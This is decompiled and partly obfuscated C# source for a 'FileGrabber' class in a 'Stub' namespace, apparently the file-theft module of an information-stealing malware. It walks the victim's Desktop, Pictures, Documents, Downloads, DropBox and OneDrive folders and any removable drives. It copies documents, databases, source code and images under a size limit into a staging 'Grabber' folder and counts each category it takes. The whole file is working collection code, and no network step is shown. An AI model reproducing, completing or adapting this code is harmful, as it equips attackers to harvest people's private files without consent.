using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000039 RID: 57
	internal sealed class FileGrabber
	{
		// Token: 0x0600010E RID: 270 RVA: 0x0000CAD8 File Offset: 0x0000ACD8
		private static string RecordFileType(string type)
		{
			if (!(type == "Document"))
			{
				if (!(type == "DataBase"))
				{
					if (!(type == "SourceCode"))
					{
						if (type == "Image")
						{
							Counter.GrabberImages++;
						}
					}
					else
					{
						Counter.GrabberSourceCodes++;
					}
				}
				else
				{
					Counter.GrabberDatabases++;
				}
			}
			else
			{
				Counter.GrabberDocuments++;
			}
			return type;
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0000CB58 File Offset: 0x0000AD58
		private static string DetectFileType(string extensionName)
		{
			string text = extensionName.Replace(".", "").ToLower();
			foreach (KeyValuePair<string, string[]> keyValuePair in Config.GrabberFileTypes)
			{
				foreach (string text2 in keyValuePair.Value)
				{
					if (text.Equals(text2))
					{
						return FileGrabber.RecordFileType(keyValuePair.Key);
					}
				}
			}
			return null;
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000CBFC File Offset: 0x0000ADFC
		private static void GrabFile(string path)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(path);
				if (fileInfo.Length <= (long)Config.GrabberSizeLimit)
				{
					if (!fileInfo.Name.Equals("desktop.ini", StringComparison.OrdinalIgnoreCase))
					{
						string text = FileGrabber.DetectFileType(fileInfo.Extension);
						if (text != null)
						{
							string directoryName = Path.GetDirectoryName(path);
							if (directoryName != null)
							{
								string pathRoot = Path.GetPathRoot(path);
								if (pathRoot != null)
								{
									string text2 = "DRIVE-" + pathRoot.Replace(":", "").TrimEnd(new char[] { '\\' });
									string text3 = directoryName.Substring(pathRoot.Length);
									string text4 = Path.Combine(FileGrabber._savePath, text2, text3);
									string text5 = Path.Combine(text4, fileInfo.Name);
									if (!Directory.Exists(text4))
									{
										Directory.CreateDirectory(text4);
									}
									fileInfo.CopyTo(text5, true);
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Logging.Log("Error copying file '" + path + "': " + ex.Message, true);
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0000CD24 File Offset: 0x0000AF24
		private static async Task GrabDirectoryAsync(string path)
		{
			try
			{
				if (Directory.Exists(path))
				{
					IEnumerable<string> dirs;
					IEnumerable<string> files;
					try
					{
						dirs = Directory.EnumerateDirectories(path);
						files = Directory.EnumerateFiles(path);
					}
					catch (UnauthorizedAccessException)
					{
						return;
					}
					catch (Exception ex3)
					{
						Exception ex = ex3;
						Logging.Log("Error accessing directory '" + path + "': " + ex.Message, true);
						return;
					}
					IEnumerable<Task> fileTasks = files.Select((string file) => Task.Run(delegate
					{
						FileGrabber.GrabFile(file);
					}));
					TaskAwaiter taskAwaiter = Task.WhenAll(fileTasks).GetAwaiter();
					TaskAwaiter taskAwaiter2;
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter.GetResult();
					IEnumerable<Task> dirTasks = dirs.Select((string dir) => FileGrabber.GrabDirectoryAsync(dir));
					TaskAwaiter taskAwaiter3 = Task.WhenAll(dirTasks).GetAwaiter();
					if (!taskAwaiter3.IsCompleted)
					{
						await taskAwaiter3;
						taskAwaiter3 = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter3.GetResult();
					dirs = null;
					files = null;
					fileTasks = null;
					dirTasks = null;
				}
			}
			catch (Exception ex3)
			{
				Exception ex2 = ex3;
				Logging.Log("Error in directory '" + path + "': " + ex2.Message, true);
			}
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0000CD68 File Offset: 0x0000AF68
		public static async Task RunAsync()
		{
			try
			{
				FileGrabber._savePath = Path.Combine(Paths.InitWorkDir(), "Grabber");
				if (!Directory.Exists(FileGrabber._savePath))
				{
					Directory.CreateDirectory(FileGrabber._savePath);
				}
				List<string> targetDirs = new List<string>(FileGrabber.TargetDirs);
				foreach (DriveInfo drive in DriveInfo.GetDrives())
				{
					if (drive.DriveType == DriveType.Removable && drive.IsReady)
					{
						targetDirs.Add(drive.RootDirectory.FullName);
					}
					drive = null;
				}
				DriveInfo[] array = null;
				IEnumerable<Task> tasks = targetDirs.Select((string dir) => FileGrabber.GrabDirectoryAsync(dir));
				await Task.WhenAll(tasks);
				targetDirs = null;
				tasks = null;
			}
			catch (Exception ex)
			{
				Logging.Log("Error running FileGrabber: " + ex.Message, true);
			}
		}

		// Token: 0x06000113 RID: 275 RVA: 0x000038B4 File Offset: 0x00001AB4
		public FileGrabber()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000114 RID: 276 RVA: 0x0000CDA8 File Offset: 0x0000AFA8
		static FileGrabber()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			FileGrabber._savePath = Path.Combine(Paths.InitWorkDir(), "Grabber");
			FileGrabber.TargetDirs = new List<string>
			{
				Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
				Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
			};
		}

		// Token: 0x04000135 RID: 309
		private static string _savePath;

		// Token: 0x04000136 RID: 310
		private static readonly List<string> TargetDirs;
	}
}
